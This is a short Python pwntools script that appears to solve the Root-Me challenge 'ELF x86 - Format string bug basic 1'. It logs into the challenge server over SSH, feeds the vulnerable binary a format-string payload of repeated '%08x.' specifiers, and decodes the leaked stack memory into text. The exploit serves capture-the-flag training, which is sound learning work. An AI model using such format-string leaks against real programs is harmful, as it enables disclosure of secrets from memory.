# Root-Me: ELF x86 - Format string bug basic 1
# woanmeo11

from pwn import *

chall = 'app-systeme-ch5'
r = ssh(host='challenge02.root-me.org', port=2222, user=chall, password=chall)

payload = '%08x.' * 15
r = r.process(['ch5', payload])

st = str(r.recv()).split('.')[1:-1]
for x in st:
    t = ''
    for i in range(0, len(x), 2):
        t = chr(int(x[i:i+2], 16)) + t
    print(t, end='')


